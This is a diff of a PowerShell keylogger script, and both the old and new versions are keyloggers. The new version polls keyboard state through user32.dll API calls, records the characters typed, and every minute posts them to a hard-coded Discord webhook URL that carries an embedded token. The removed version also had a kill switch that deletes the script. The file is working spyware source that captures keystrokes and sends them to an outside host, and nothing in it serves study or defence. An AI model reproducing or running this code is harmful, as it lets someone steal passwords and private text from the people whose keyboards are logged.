@@ -1,69 +1,97 @@
-$dc='https://discord.com/api/webhooks/1321909727935991908/3Ij5e0nJRJEiIyucAsphE-K2Mh2OiugdIPCssnBRbWDUKUiczpQiqC9RnRCBASFeNg6W';
-$log='';
-$ks='';
+#requires -Version 2
+function Start-KeyLogger() 
+{
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
 
-$wsh=New-Object -ComObject WScript.Shell;
-$wsh.AppActivate('Windows PowerShell')
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+  # Discord webhook URL
+  $dc = 'https://discord.com/api/webhooks/1321909727935991908/3Ij5e0nJRJEiIyucAsphE-K2Mh2OiugdIPCssnBRbWDUKUiczpQiqC9RnRCBASFeNg6W'
 
-$code = {
-    function Get-KeyPress {
-        $host.ui.RawUI.FlushInputBuffer()
-        $key = $host.ui.RawUI.ReadKey('NoEcho, IncludeKeyDown')
-        $key.Character
+  # Function to send messages to Discord
+  function Send-Discord($message) {
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add('Content-Type','application/json')
+    $wc.Encoding = [System.Text.Encoding]::UTF8
+    try {
+        $wc.UploadString($dc, (ConvertTo-Json @{content=$message}))
+    } catch {
+        Write-Host "Failed to send data to Discord. Error: $_"
     }
+  }
 
-    function Send-Discord {
-        Write-Host "Sending data to Discord..."
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add('Content-Type','application/json')
-        $wc.UploadString($dc, (ConvertTo-Json @{content="$(Get-Date): $log"}))
-        Write-Host "Data sent successfully."
-        $log = ''
-    }
+  $log = ""
+  $timer = [System.Diagnostics.Stopwatch]::StartNew()
 
-    function Check-Killswitch {
-        if ($ks -ne '') {
-            if ($(Get-Date) -ge [datetime]$ks) {
-                Write-Host "Kill switch activated. Removing script..."
-                Remove-Item $PSCommandPath -Force
-                exit
-            }
-        }
-    }
+  try
+  {
+    Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red
 
-    Write-Host "Starting key logging..."
+    # Send debug message to Discord indicating script has started
+    Send-Discord "Keylogger script started at $(Get-Date)"
+
     while ($true) {
-        $c = Get-KeyPress
-        if ($c -eq [char]13) {
-            $log += "`r`n"
-            Write-Host "Enter pressed."
-        } elseif ($c -eq [char]8) {
-            if ($log.Length -gt 0) {
-                $log = $log.Substring(0,$log.Length-1)
-                Write-Host "Backspace pressed. Log reduced to: $log"
-            }
-        } elseif ($c -ne [char]9) {
-            $log += $c
-            Write-Host "Logged: $c"
+      Start-Sleep -Milliseconds 50
+      
+      # Scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # Get current key state
+        $state = $API::GetAsyncKeyState($ascii)
+
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          # Translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          # Get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          # Prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          # Translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+          if ($success -and ([char]::IsLetterOrDigit($mychar.ToString()) -or [char]::IsPunctuation($mychar.ToString()) -or [char]::IsWhiteSpace($mychar.ToString()))) {
+            Write-Host "Captured: $($mychar.ToString())"
+            $log += $mychar.ToString()
+          }
         }
-        if ($log.Length -gt 1000 -or ($log -ne '' -and $log.EndsWith("`n"))) {
-            Send-Discord
-            Check-Killswitch
+      }
+
+      # Check if 10 seconds have passed
+      if ($timer.Elapsed.TotalSeconds -ge 60) {
+        if ($log -ne "") {
+          Send-Discord "$(Get-Date): Keys logged - $log"
+          $log = ""
         }
+        $timer.Restart()
+      }
     }
+  }
+  finally
+  {
+    # If there's any remaining log data when stopping, send it
+    if ($log -ne "") {
+      Send-Discord "$(Get-Date): Final keys logged - $log"
+    }
+    Write-Host "Keylogger stopped."
+  }
 }
 
-Write-Host "Starting background job..."
-$job = Start-Job -ScriptBlock $code
-
-Write-Host "Main loop started..."
-while ($true) {
-    Start-Sleep -Seconds 3600
-    # Check if there's any logged data to send before sleeping again
-    if ($log.Length -gt 0) {
-        Write-Host "Sending logged data from main loop..."
-        Send-Discord
-        Check-Killswitch
-    }
-    $log = ''
-}
+# Start the key logger
+Start-KeyLogger
